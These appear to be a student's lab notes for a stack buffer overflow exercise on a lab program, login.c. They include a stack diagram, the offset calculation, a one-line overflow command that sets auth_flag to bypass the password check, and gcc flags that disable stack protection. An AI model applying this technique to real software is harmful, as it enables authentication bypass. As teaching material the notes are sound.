
1. Set up requirements, making sure gcc and stuff is already installed. 

Calculate your team_var[xx] size
xx = (team_member NUID % 512)
2590422 % 512 = 214


![[Pasted image 20260401093728.png]]

![[Pasted image 20260401093533.png]]

## Part 1 — login.c (Simple Overflow)

**Goal:** Get `auth_flag = 1` without knowing the password.

**Stack layout inside `check_authentication`:**

```
LOW ADDRESS
┌──────────────────┐ 0x7fffffffeaa0  ← username_buffer[16]
│ username_buffer  │
├──────────────────┤ 0x7fffffffeab0  ← team_var[333]
│    team_var      │
├──────────────────┤
│                  │
│   (333 bytes)    │
│                  │
├──────────────────┤ 0x7fffffffec0c  ← auth_flag (int)
│    auth_flag     │
└──────────────────┘
HIGH ADDRESS
```

**The math:**

```
0x7fffffffec0c - 0x7fffffffeaa0 = 364 bytes
```

So if you write 364 bytes into `username_buffer` (which only holds 16), you reach `auth_flag`. The 365th byte overwrites it with a non-zero value → access granted.

**The exploit:**

bash

```bash
./login `python -c "print('A'*364 + '\x01')"` password
```.



**Step 1: Compile first**

bash

```bash
gcc -g -fno-stack-protector -z execstack -o login login.c
```

The flags matter:

- `-g` → include debug symbols (so gdb can see variable names)
- `-fno-stack-protector` → disable stack canary protection (lets overflow work)
- `-z execstack` → makes stack executable (needed for Part 2)

**Step 2: Then open gdb with the binary**

bash

```bash
gdb ./login
```













